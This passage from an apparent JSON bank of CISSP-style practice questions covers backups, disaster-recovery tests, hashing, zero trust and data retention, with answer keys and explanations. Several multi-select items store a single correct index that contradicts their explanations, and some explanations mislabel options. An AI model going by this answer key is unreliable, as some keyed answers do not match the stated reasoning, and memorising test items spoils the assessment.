      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. According to the schedule, every file on the server will be backed up on Wednesday evening's full backup. Then, during Friday's differential backup, any file modified and created since the previous full backup will be copied. There are five of these files: files A, B, C, E, and F."
    },
    {
      "id": "d7-q49",
      "domain": "7. Security Operations",
      "stem": "Which option disaster recovery tests involves team members walking through a scenario but no alterations are made to the information systems?",
      "choices": [
        "Full interruption test",
        "Checklist review",
        "Parallel test",
        "Tabletop exercise"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. A tabletop exercise refers to a disaster recovery test where team members are brought together to walk through a scenario. However, no change is made to the information systems. Option 1 is not correct because full interruption is where team members take down the main site and give an assurance that the site used for disaster recovery has the capacity to host regular operations. Option 2 is not correct because checklist review involves a process wherein team members are given their disaster recovery checklist content to review on their own and propose changes in case any are needed. This type of test causes the least disruptions. Option 3 is not correct because the parallel test involves the activation of an alternative site for disaster recovery testing, while the main site remains functional."
    },
    {
      "id": "d3-q42",
      "domain": "3. Security Architecture and Engineering",
      "stem": "Bina works as CISO in a local bank. She has proposed to the bank manager that they need to hash all the messages sent to their customers to ensure the messages remain authentic. The bank manager has requested that Bina share some features of hashing algorithms with them before they approve the proposal. Which option are characteristics of a hashing algorithm? Choose ALL answers that apply.",
      "choices": [
        "A hashing algorithm takes variable-length input.",
        "Getting two messages that share the same hash value is almost impossible.",
        "A hashing algorithm can be reversed.",
        "A hashing algorithm requires a cryptographic key."
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "The correct answers are options 1 and 2. Hash functions take a variable-length input, and it's almost impossible to have two messages with a common value in hash functions. 3 is incorrect because the hashing algorithm cannot be reversed. Option 4 is not correct because there is no secrecy attribute within hash functions, so they do not need a cryptographic key."
    },
    {
      "id": "d3-q43",
      "domain": "3. Security Architecture and Engineering",
      "stem": "Jayesh works as a security facility officer in a bank. As part of security measures, he has decided to educate the other employees on methods of suppressing the different classes of fire in case of an emergency. He has prepared a table showing the different fire classes and methods of suppressing them. However, two classes and their corresponding methods in the table are incorrect. Which two fire classes and their suppression methods does Jayesh have to correct before sharing the information with employees?",
      "choices": [
        "Classes A and B",
        "Classes C and D",
        "Classes A and C",
        "Classes C and K"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. Fire classes are classified as classes A, B, C, D, and K. It is critical to know the types of fire and how to fight each of them. Class A fires contain common combustible materials such as paper, cloth, or wood. Such a fire should be extinguished using soda acid or water, not gas. Class C fires have some electrical element such as a computer or any other equipment that uses electricity to run. This type of fire should be suppressed using a gas such as CO2. Options 1, 2, and 4 are not correct answers because fire classes B, D, and K are correctly matched with their methods of suppression."
    },
    {
      "id": "d7-q50",
      "domain": "7. Security Operations",
      "stem": "The following statements refer to the concept of executive succession planning. Which statement is INCORRECT?",
      "choices": [
        "Executive succession planning involves bringing a skeleton crew onboard following a disaster to continue essential operations.",
        "The responsibilities of deputies are documented.",
        "Two or more senior employees should not be exposed to a particular risk concurrently.",
        "In the event that a senior executive quits, the organization is protected by predetermined steps."
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct. Members of a skeleton crew are staff members who handle the most sensitive roles post-disaster. They carry out their first assignment during the recovery phase. There is no link between a skeleton crew and the concept of executive succession planning, which refers to the process by which a replacement is secured when a senior executive retires, quits, or passes away. Option 2 is not correct because documentation of deputy responsibilities is part of executive succession planning. 3 is incorrect because, in some company policies, two or more senior employees are subjected to a certain risk concurrently as part of executive succession planning. This is meant to ensure that if a disaster occurs, the senior employees and the company remain protected. Option 4 is not correct because, as part of executive succession planning, organizations establish predetermined steps to ensure the company is protected upon the retirement, death, or resignation of a senior executive staff member."
    },
    {
      "id": "d7-q51",
      "domain": "7. Security Operations",
      "stem": "Hideo has been assigned the responsibility to assess and augment the physical security of his business. Which option approaches and controls should he apply to ensure proper enforcement?",
      "choices": [
        "Layered facility access controls",
        "External boundary controls",
        "Personnel access controls",
        "Physical facility access controls"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct. Enforcement of physical security can only be achieved by applying a defense-in-depth mechanism using layered defenses. The assumption should be that a dedicated hacker will have a strategy to compromise any particular control, so there is a need to have compensating controls which will equip the defender with the ability to thwart any breach. Option 2 is not correct because, despite being a critical first layer of defense, people are granted access through them intentionally. They can easily be bypassed by an attacker. Option 3 is not correct because, just like mechanical and physical locks, defeating of personnel access controls is also easy. Trained hackers can easily spoof biometric systems, clone smart badges, or forge ID badges. Option 4 is not correct because, without considering the security level or \"grade\" offered by a physical lock, a knowledgeable attacker can bypass a device or mechanical lock."
    },
    {
      "id": "d7-q52",
      "domain": "7. Security Operations",
      "stem": "Afsana works as a security officer in a local bank. She has been asked to teach a group of new employees how to comply with the bank's security policy as they perform their day-to-day tasks. This event is called ____________?",
      "choices": [
        "Education",
        "Awareness",
        "Training",
        "Termination"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. Training refers to teaching personnel how to carry out their job responsibilities (in this case, as they adhere to the security policy of a company). Organizations often host training that targets employees who share common job responsibilities. Also, it is critical to train new staff to ensure they comply with an organization's procedures, guidelines, and the standards stipulated by the security policy. Option 1 is not correct because education refers to a process that seeks to teach users (as opposed to employees) in greater scope and detail what they need to know for a given subject, and may include theory and instruction beyond job tasks and requirements. Option 2 is not correct because awareness is a process that establishes the minimum standard/common denominator or understanding of security. Option 4 is not correct because termination refers to a process whereby an employee's service to an organization comes to an end."
    },
    {
      "id": "d8-q33",
      "domain": "8. Software Development Security",
      "stem": "Meera is a software developer in a business that sells toys online. She has been tasked with the responsibility of developing software that will ease how customers make their payments. If Meera decides to apply the waterfall model of software development, which of the following answers shows the steps she will follow from first to last?",
      "choices": [
        "Design, Requirements, Testing, Coding, Maintenance",
        "Design, Requirements, Coding, Testing, Maintenance",
        "Requirements, Design, Coding, Testing, Maintenance",
        "Requirements, Design, Testing, Coding, Maintenance"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. The five steps followed in the waterfall model software development process are Requirements, Design, Coding, Testing, and Maintenance. Option 1 is not correct because apart from maintenance, the other steps are not correct. Option 2 is not correct because the Requirements and Design steps have been interchanged. Option 4 is not correct because the Coding and Testing steps have been interchanged."
    },
    {
      "id": "d8-q34",
      "domain": "8. Software Development Security",
      "stem": "Pallavi has discovered that programmers within her enterprise, when enforcing certain changes to software components, are not documenting their work or adhering to version control before uploading it to the primary software repository. This situation has caused confusion and forced some departments to revert to the initial versions. The best solution to this situation is ____________________?",
      "choices": [
        "Software configuration management",
        "Software change control management",
        "Software configuration management escrow",
        "Software escrow"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct. A software configuration management system enables change control processes to be accomplished using automation when changes are made to a software product while still in the development life cycle. Option 2 is not correct because software change control management only forms a portion of software configuration management and is not an official term used to refer to this kind of functionality. 3 is not correct since software configuration management escrow is not an official term. Option 4 is not correct because, with software escrow, a copy of the source code is stored by a third party and released to the customer only under certain circumstances (for instance, if the code developer is no longer in business)."
    },
    {
      "id": "d1-q68",
      "domain": "1. Security and Risk Management",
      "stem": "Ransomware and Malware affect which of the following principles of security the most respectively?",
      "choices": [
        "Confidentiality and Availability",
        "Integrity and Confidentiality",
        "Availability and Integrity",
        "Confidentiality and Non-Repudiation"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. Ransomware primarily impacts the availability of the data and may also affect the integrity of the data. Malware on the other hand primarily affects the integrity of the data. Confidentiality is affected when one tries to extract information that is not intended for that individual, for example - eavesdropping, network monitoring, shoulder surfing, Sniffing, etc Non-Repudiation is the principle of associating actions with a unique individual, such that we can clearly prove that the action is performed by the involved party. This is generally done via Digital Signatures, Authentication, logging, etc."
    },
    {
      "id": "d1-q69",
      "domain": "1. Security and Risk Management",
      "stem": "Your enterprise has hired a new Security Architect who has experience with products from a particular vendor and is therefore inclined to use their suite of products. She suggests your team replaces the existing tools with the products of her chosen vendor. What is the primary concept missing from this action?",
      "choices": [
        "Risk Assessment",
        "Due Diligence",
        "Due Care",
        "Strategic Alignment"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. The primary goal of a security professional is to achieve the fundamental objectives of Confidentiality, Integrity, and Availability while supporting the organization's objective – Strategic Alignment. The inclusion or replacement of products should not be driven by emotions or preference but rather be based on Risk Assessment and Due Diligence. Other objectives include Value Delivery, Customer Satisfaction, and Reduced Liability. The above preference-based decision seems to be distant from all the aforementioned objectives. All the decisions must be strategically aligned with the Organization's Goals. Risk Assessment (1) is the crucial step involved while making any security decision, however, it is still a component of Strategic Alignment (4). Same is the case with due dilligence (2) and due care (3)."
    },
    {
      "id": "d1-q70",
      "domain": "1. Security and Risk Management",
      "stem": "Data Leakage is the primary cause of concern for which of the following organizational processes?",
      "choices": [
        "Acquisitions",
        "Divestitures",
        "Change Control",
        "Governance"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. Data Leakage is the primary cause of concern in cases of divestitures; the partial or full disposal of a business unit through sale, exchange, closure, or bankruptcy. A divestiture most commonly results from a management decision to cease operating a business unit because it is not part of a company's core competency. Proper Sanitization processes need to be ensured along with Exit Interviews to make sure that Data Leakage/Disclosure should not happen. Cybersecurity governance is how an organization controls its security, including defining its risk appetite, building accountability frameworks, and establishing who is responsible for making decisions. It is the responsibility of the Senior Management. Acquisitions refer to the organization's acquisition of a business (be it full or part). In such a scenario, the primary cause of concern is the increased level of risk along with possible downtime and failure to achieve a Return on Investment. Change Control ensures that all the changes introduced in the system are tested, documented, controlled, and monitored, such that System Integrity is maintained. The cause of concern with Change Control could be lacking visibility, doing the impact analysis, updating appropriate documents, managing and coordinating between different teams, etc."
    },
    {
      "id": "d1-q71",
      "domain": "1. Security and Risk Management",
      "stem": "The Stuxnet (2010) Advance Persistent Threat (APT) impacted specialized hardware equipment and included many zero-day attacks. What is the best way to safeguard enterprises against such attacks?",
      "choices": [
        "Define Security Policies that ensure defense in depth",
        "Deploy IDS/IPS, Firewalls with strict ingress/egress rules",
        "Classify the Organization's infrastructure and apply appropriate safeguards based on the criticality",
        "Perform Risk Management and define safeguards accordingly"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct. Zero-day vulnerabilities are unknown to the vendor and hence there is no fix to the vulnerability of system/software/control. The best way to deal with zero-day vulnerabilities is to have clearly defined Security Policies that ensure defense in depth. Security Policies define the asset classifications (3), based on which the criticality of assets is evaluated and a cost-benefit analysis is done (4). Based on the Risk Analysis, specific controls are defined (2)."
    },
    {
      "id": "d1-q72",
      "domain": "1. Security and Risk Management",
      "stem": "Which is the most applicable set of regulations to your enterprise, given that your enterprise is a payment service provider?",
      "choices": [
        "Payment Card Industry- Data Security Standard (PCI-DSS)",
        "Local Regulations based on the Jurisdiction",
        "Health Information Portability and Accountability Act (HIPAA)",
        "The Payment Service Regulations"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. \"Think Global, Act Local\"; with regulations, you need to adhere to the local jurisdictions, these are always most applicable to your organization. Option 1 is not correct because, while PCI-DSS (Payment Card Industry Data Security Standard) is a Payment Service Provider contractual requirement, and meeting this will help you protect your data and customers' information from breaches and theft, the question asks about the most applicable regulations. These will always be the local regulations applicable to your business (2). Option 3 is not correct because HIPAA(Health Information Portability and Accountability Act) is a series of federal regulatory standards that outline the lawful use and disclosure of protected health information in the United States, and are therefore not the most applicable to your organization. Similarly, D, the Payment Service Regulations 2017, is not correct as these set out the rules relating to all 'payment services' including the services provided by banks, building societies, and debit card providers in the UK."
    },
    {
      "id": "d1-q73",
      "domain": "1. Security and Risk Management",
      "stem": "Your enterprise, a health service provider, has acquired a new health-based Cloud Product that registers users and collects their Personally Identifiable Information (PII). What is the first step you as a Cybersecurity Expert will do to analyze the Privacy Requirements of the new product?",
      "choices": [
        "Evaluate and document the data collected",
        "Identify if the Cloud Provider adheres to Health Information Portability and Accountability Act (HIPAA)",
        "Validate if the new product adheres to your organization's Privacy Requirements",
        "Evaluate the Statement of Applicability (SOA) of ISO 27001"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct. The first step to evaluating the privacy requirements of any product will be to identify, evaluate, and document the data collected by that product. Once you know what data has been collected from the user, you can identify what data is relevant and ensure you are only collecting that which is necessary. Option 2 is not correct as it is the next step to identify the location/jurisdiction of the users, which helps us to identify which Data Protection law applies to us in case of a data breach. Option 3 is also incorrect. Of course, we need to validate whether the Cloud Application adheres to the Organization's Privacy Requirements and/or Health Information Portability and Accountability Act (HIPAA), but the first step should be to analyze the data collected by the application. Evaluation of Service Organization Controls (SOC2) reports is a crucial step before acquisition during the due diligence, but in this scenario, the product is already acquired, hence this option 4 is incorrect"
    },
    {
      "id": "d1-q74",
      "domain": "1. Security and Risk Management",
      "stem": "You identify a security error in which the firewall is restarted several times during the course of a given period of time. While the firewall is down (between restarts), it allows traffic into the enterprise which is otherwise denied by default. What type of investigation are you most likely to perform as a Security Consultant?",
      "choices": [
        "Criminal",
        "Administrative",
        "Civil",
        "Regulatory"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. Administrative/Organizational investigation has the least burden of proof as the intention of the investigation is to identify the root cause behind the issue and to make sure the issue does not happen again. option 1 is not correct as a criminal Investigation has the highest burden of proof (\"Beyond a reasonable doubt\") as once the culprit is identified and proven, this could lead to imprisonment and/or fines. Option 3 is not correct as a civil Investigation has a lesser burden of proof than a criminal investigation, but still greater than administrative (it requires a \"Preponderance of Evidence\"). Examples of Civil cases are Intellectual Property Violations or events/practices that may violate an individual's or organization's legal rights. Civil cases generally lead to compensating the victim (monetary fines or the abolishment of practices that led to the case). Option 4 is not correct as regulatory investigations often take the form of external, mandatory audits, and are focused on evaluating security controls and compliance. A Regulatory investigation may take the form of an organizational investigation, civil investigation, or criminal investigation depending upon the type of incident. Regulatory investigations are conducted by a regulating body, against an organization suspected of a violation."
    },
    {
      "id": "d1-q75",
      "domain": "1. Security and Risk Management",
      "stem": "What is the best way to safeguard your enterprise against the use of external storage devices by employees/business partners who have access to the organizational resources?",
      "choices": [
        "Install Intrusion Detection/Prevention Software",
        "Disable the USB Ports on all the machines",
        "Install third party tools which detect and block the use of external storage devices",
        "Define Security Policy, standards, procedures, and guidelines against the use of external devices"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. The best way to safeguard against any threat is to define the action plan and the set of rules, policies, standards, procedures, and guidelines to make sure that you have addressed the issue. Once these are defined depending upon the Risk Assessment, the appropriate controls are identified and placed to reduce the risk. CISSP requires you to think like a manager, not solve the issue. Other options require you to fix the problem."
    },
    {
      "id": "d1-q76",
      "domain": "1. Security and Risk Management",
      "stem": "Based on a recent incident, you found that the Recovery Time Objective (RTO) of a critical server crossed the determined Maximum Tolerable Downtime (MTD). Which is the best way to reduce the RTO and bring it within the agreeable limits?",
      "choices": [
        "Incremental Backups",
        "Differential Backups",
        "High Availability",
        "Fault Tolerance"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. Among the given options, High Availability and data resilience help reduce the Recovery Time Objective. High Availability environments ensure that active data replication is in place, which further ensures that even if one or more environments go down, the remaining active environments can handle the data load. Options 1 and 2 are incorrect as backups (incremental or differential) relate to the Recovery Point Objective (RPO). Fault Tolerance (4) makes sure the environment works in a proper way even if there is a fault in one or more components, however, the above question is asking about the RTO that is used when the system is down and needs to be recovered, hence option 4 is not the correct answer."
    },
    {
      "id": "d1-q77",
      "domain": "1. Security and Risk Management",
      "stem": "Recent Security Reports show that many developers are using free cloud-based tools like data formatters, data parsers, convertors, and comparators. They copy the enterprise's code into these tools instead of using the enterprise's provided tool to process the data. Which option agreements is most likely to be violated?",
      "choices": [
        "Acceptable Use Policy",
        "Non-Disclosure Agreement",
        "Non-Compete Agreement",
        "Employment Contract"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct. Acceptable Use Policy (AUP) provides your employees with an understanding of how they are expected to use the organization's resources. This involves Internet Usage Policy, Work from Home Policy, and Endpoint Security Policy. The policy helps to protect both the organization and the employee. The employee will be aware that browsing certain sites and downloading certain files is prohibited and that the policy must be adhered to or there could be serious repercussions, thus leading to fewer security risks for the business as a result of employee negligence. The policy outlines the Do's and Don'ts along with the penalties in case of violation. The AUP helps to ensure that the employees understand the organization's policy and prohibits intentional or unintentional sensitive data leakage through internet tools. A Non-Disclosure Agreement (2) prohibits sharing of organizational data with third parties. It is a legal contract between at least two parties that outlines confidential material, knowledge, or information that the parties wish to share with one another for certain purposes but wish to restrict access to. Examples of violations of NDAs include telling friends or family members about the protected material, releasing company information to the press or to the consumer public, releasing photos, videos, or audio recordings of the sensitive material, or informing competing businesses about the company's plans. NDAs apply to the employee even after the employee leaves the organization. In Non-Compete Agreements (3), the Employee specifically agrees that for a period of X [months/years] after the Employee is no longer employed by the Company, the Employee will not engage, directly or indirectly, either as proprietor, stockholder, partner, officer, employee or otherwise, in the same or similar activities as were performed for the Company in any business. Examples of breaches of Employee Contracts (4) include breach of the Organization's AUP, NDA, NCA (if applicable), breaking any restraints of trade clauses in the employment contract, such as going to work for a competitor when your contract doesn't allow it, taking your client contact list with you when you leave, and quitting without giving proper notice as per your contract."
    },
    {
      "id": "d1-q78",
      "domain": "1. Security and Risk Management",
      "stem": "During the design of a new feature, the Security Architect identifies a potential security risk in the new process design. As the feature is critical and the delivery timelines are short, which of the following is the least likely risk response of the business?",
      "choices": [
        "Risk Mitigation",
        "Risk Acceptance",
        "Risk Ignorance",
        "Risk Transfer"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. Risk Ignorance or Risk Rejection are the least likely risk responses and are considered negligence. Denying that a risk exists and hoping that it will never be realized is not valid or a display of a prudent due care/due diligence response to risk. Risk Mitigation (1) involves the use of security policies and processes to reduce the overall risk or impact of a cybersecurity threat. Risk Acceptance (2) occurs when a business or individual acknowledges that the potential loss from a risk is not great enough to warrant spending money to avoid it. Risk transfer (4) involves the contractual shifting of risk from one party to another. One example is the purchase of an insurance policy. One thing to note is that the organization cannot outsource regulatory compliance risks or reputational damage risks."
    },
    {
      "id": "d1-q79",
      "domain": "1. Security and Risk Management",
      "stem": "You are asked to initiate a Threat Modeling exercise within your enterprise. Since this is the first time the enterprise is doing this, what will be the next step after identifying the objective for the Threat Modeling exercise?",
      "choices": [
        "Identify Threats",
        "Identify Vulnerabilities",
        "Identify Risks",
        "Identify Assets"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. Threat modeling enables you to perform a proactive cybersecurity threat assessment. Security teams use threat modeling insights to evaluate risks and prioritize mitigation. Threat modeling can help security teams prioritize threats, ensuring that resources and controls are applied effectively. After the organization has determined the objective of the Threat Modelling exercise, the next step will be to identify the assets that are valuable to the organization. Typical next steps of threat modeling are identifying threats, architecture analysis to determine potential attacks, reduction analysis, prioritization, and response."
    },
    {
      "id": "d2-q37",
      "domain": "2. Asset Security",
      "stem": "Your enterprise has initiated a knowledge campaign to provide free courses to all. Which option data classification categories relates most closely to the course content?",
      "choices": [
        "Confidential",
        "Private",
        "Sensitive",
        "Public"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. The above scenario corresponds to the Private/Business Sector. The course content, however, corresponds to information that is publicly available to everyone. Organizations generally maintain the integrity of public information. Though free, this is still the Intellectual Property of the Organization. Confidential (1) is a classification used for data that is extremely sensitive and for internal use only. A significant negative impact could occur for a company if confidential data is disclosed. Confidential data is sometimes labeled as proprietary. If proprietary data is disclosed, it can have drastic effects on the competitive edge of an organization. Private (2) is a classification used for data that is of a private or personal nature and intended for internal use only. If disclosed a significant negative impact could occur for the company/individuals. Sensitive (3) is the classification given to data that should not be available to everyone (like public data) but which isn't private or confidential. A negative impact could occur on the company if sensitive data is disclosed. An example of Sensitive Data is Internal Network Design, Software used, etc."
    },
    {
      "id": "d2-q38",
      "domain": "2. Asset Security",
      "stem": "Your enterprise follows strict data classification policies and marks all sensitive and critical systems with appropriate data classification. However, you find that the enterprise does not mark or label the non-confidential components. What is the issue with this approach?",
      "choices": [
        "Unlabelled data intrinsically means unclassified information",
        "No Retention Policy is applied to the unlabelled data",
        "Unlabelled data could lead to mishandling",
        "All of the above"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. When you do not label the data and/or systems with appropriate classifications, you won't be sure of the kind of data you are dealing with. This can lead to mishandling of the data. All the Data Handling Policies, Data Archiving, and Data Retention Policies are defined based on the data classification. It is therefore crucial to label all the data/systems with the appropriate level of classification."
    },
    {
      "id": "d2-q39",
      "domain": "2. Asset Security",
      "stem": "During a recent Cloud Initiative, your business unit decided to move the financial reports to the Private Cloud environment. The Cloud Service Provider provides additional multiple layers of security via Mutual Certificate Authentication and Industry-level encryption. Given the additional features provided by the Cloud Service Provider, what level of protection should be applied to the financial reports?",
      "choices": [
        "The same level of protection as on-premises",
        "A higher level of protection than on-premises",
        "Less protection due to CSP default features",
        "No additional protection due to CSP default features"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct. The level of protection applied to the data should be determined by Data Classification. For example, confidential data should be protected based on how it is mentioned in the organization's policy on safeguarding confidential information. The data must be protected with the same level of protection be it on-premises or cloud."
    },
    {
      "id": "d2-q40",
      "domain": "2. Asset Security",
      "stem": "Recently, one of your highly critical systems failed. Thankfully due to High Availability, the business was not significantly impacted. The Root Cause Analysis pointed out that the server's hard disk had failed. You have outsourced the hardware management to a third-party vendor, and they have already provided you with a replacement and taken away the damaged one. What is the potential issue with this?",
      "choices": [
        "Since the server is critical, third-party vendors should not have been involved",
        "Mishandling of Organizational Data remnants in the HDD by the vendor",
        "Health checks of other systems in the HA infrastructure will not be checked",
        "No issue with the process."
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. A damaged HDD can be used to recover critical organizational data. Before handing over the damaged system to the vendor, the existing hardware should be sanitized based on the organization's Security Policies. Without this step, there is potential for mishandling of the organization's critical data by the vendor."
    },
    {
      "id": "d2-q41",
      "domain": "2. Asset Security",
      "stem": "Which option factors is least considered when establishing an enterprise's Data Retention Policy?",
      "choices": [
        "Litigation Obligations",
        "Business Needs",
        "Data Source",
        "Regulations"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. The Data Retention Policy is usually driven by Business needs, Industrial Regulations, Litigation Needs, etc. However, the source of data does not drive the Data Retention Policy. The first step to developing the Data Retention Policy generally involves evaluation of the Business Needs, Applicable Regulations, and Litigation needs if applicable. This is generally followed by Data Classification and defining appropriate policies that define how long the data should be retained."
    },
    {
      "id": "d2-q42",
      "domain": "2. Asset Security",
      "stem": "In compliance with your Enterprise's Data Retention Policies, you have archived the logs generated in your SIEM systems. Which option options can you perform on the archived data? (Select TWO)",
      "choices": [
        "Create",
        "Read",
        "Update",
        "Delete"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "The correct answers are options 2 and 4. Options 1 and 3 are incorrect as you cannot update/create the contents after the data is archived. Once the data is archived, appropriate controls should be placed in order to make sure that the contents cannot be updated. However, the read and deletion of data (B and D, respectively) are permitted based on the Organization's Retention Policy and are therefore the correct answer options for this question. The NIST Special Publication 800-92, \"Guide to Computer Security Log Management\" establishes guidelines and recommendations for securing and managing sensitive log data. NIST SP 800-92 defines a log management infrastructure as having 4 major functions: 1. General - log parsing, event filtering, and event aggregation. 2. Log Storage - rotation, archival, compression, reduction, normalization, integrity checking. 3. Log Analysis - event correlation, viewing, and reporting. 4. Disposal – clearing."
    },
    {
      "id": "d2-q43",
      "domain": "2. Asset Security",
      "stem": "You are appointed as a System Engineer in a bank where you will be responsible for operations and maintenance of the Information Technology (IT) Department's resources. Which option roles suites your profile the most?",
      "choices": [
        "Custodian",
        "Data Owner",
        "System Owner",
        "Administrator"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct. Data Custodians are responsible for operations and maintenance activities like daily upkeep and backups. They are responsible for the safe custody, transport, and storage of the data and implementation of business rules. A Data Owner (typically a member of the management team) is responsible for determining roles and responsibilities, classifying, and authorizing data. They may delegate tasks to the data steward, data custodian, or other roles. A System Owner is responsible for ensuring that data processed on the system remains secure. This includes identifying the highest level of data that the system processes. They then ensure that the system is labeled accurately and that appropriate security controls are in place to protect the data. Administrators are generally responsible for provisioning accounts and relevant access to the end-users."
    },
    {
      "id": "d2-q44",
      "domain": "2. Asset Security",
      "stem": "During a recent vulnerability assessment, it is uncovered that a few of the legacy systems are still using a software whose end-of-support is due next month. What is the biggest cause of concern about this report?",
      "choices": [
        "The software will stop running",
        "The system's vulnerability could not be addressed by the vendor",
        "The system's new versions will not be launched",
        "The vendor will no longer sell this software version"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. End of support (can also be known as the end of service) is when the vendor will no longer provide RMAs, technical support, repairs, or upgrades. End of life means the vendor considers the product no longer useful to be produced or effective for an environment. Perhaps it has been left behind by Moore's Law or better and more secure technology has come out. Either way, the vendor will no longer be taking the effort to sell or market it. This is outlined by the NIST SPECIAL PUBLICATION 1800-5A IT Asset Management, which provides solutions that span traditional physical asset tracking, IT asset information, physical security, and vulnerability and compliance information. Users can now query one system and gain insight into their entire IT asset portfolio. NIST SP 1800-5A has the following properties: 1. Maps security characteristics to guidance and best practices from NIST and other standards organizations, including the PCI DSS 2. Provides detailed example solution with capabilities that address security controls, as well as instructions for implementers and security engineers, including examples of all the necessary components for installation, configuration, and integration 3. Is modular and uses products that are readily available and interoperable with your existing IT infrastructure and investments"
    },
    {
      "id": "d2-q45",
      "domain": "2. Asset Security",
      "stem": "Your enterprise provides critical services to many other enterprises including Federal Agencies, Hospitals, Banks, etc, and manages the Personally Identifiable Information (PII) of the clients/users of those enterprises. Which option compliance requirements apply to your enterprise?",
      "choices": [
        "Federal Regulatory Compliance as it is the most strict",
        "Regulatory Compliance applied to Financial Institutions",
        "HIPAA as it includes both Security and Privacy Compliances",
        "All of the above and any other applicable regulatory Compliances, including local laws"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. The organization that handles data of different industries must be in compliance with all the applicable Standards and Regulations applied to that organization. These are also defined in the client agreements and the vendor/service provider must follow the standards defined by the Regulations. Along with the Industrial Regulations, the organization has to abide by the local laws and regulations applied to them."
    },
    {
      "id": "d2-q46",
      "domain": "2. Asset Security",
      "stem": "Following Asset Identification and Data Classification, what is the next step in identifying what you need to protect?",
      "choices": [
        "Configure Controls based on Secure Practices",
        "Implement the Controls",
        "Use a Security Baseline to identify Controls",
        "Tailoring and Scoping"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. Once an organization has identified and classified its assets, it will typically want to secure them by using the Security Baseline. Baselines provide a starting point and ensure a minimum-security standard. Generally, the Control Baseline (1) is selected based on Industry Best Practices, e.g., ISO 27002. After selecting a control baseline, organizations fine-tune it with tailoring and scoping processes (4). Scoping refers to removing the baselines that are not required based on Organization requirements. Tailoring refers to customizing the controls in the baselines. This is followed by adding compensating/missing controls (2) as suggested by the Baseline or replacing the baseline control with another control if required."
    },
    {
      "id": "d3-q44",
      "domain": "3. Security Architecture and Engineering",
      "stem": "Based on your recent security management meeting, it is decided that your enterprise will move its focus to the Zero Trust Principles. Which option principles applies to the concept of Zero Trust? (Select 3)",
      "choices": [
        "Never trust, always verify",
        "Operate under the assumption of a data breach",
        "Security Parameter",
        "Least Privilege"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "The correct answers are options 1, 2, and 4. Much like other kinds of digital transformations, implementing zero trust isn't a plug-and-play solution to fix the shortcomings of current cybersecurity practices. It is a total commitment to a process that alters an organization's structure. In any transformation project, there is an opportunity to reduce cybersecurity risk by applying the guiding principles of zero trust: A, Never trust, always verify: Treat every user, device, application, and data flow as untrusted. D, Authenticate and explicitly authorize each to the least privilege required using dynamic security policies. B, Operate under the assumption of a data breach: Consciously operate and defend resources with the assumption that an adversary already has a presence within an organization. Deny by default. Heavily scrutinize all users, devices, data flows, and requests for access. Log, inspect, and continuously monitor all configuration changes, resource accesses, and network traffic for suspicious activity. Verify explicitly: Access to all resources should be conducted in a consistent and secure manner using multiple attributes (dynamic and static) to derive confidence levels for contextual access decisions to resources. With the advent of Cloud Infrastructure and people working from anywhere, the concept of Security Parameter is now vague and the concept of Zero Trust is being applied to provide security against data breach."
    },
    {
      "id": "d3-q45",
      "domain": "3. Security Architecture and Engineering",
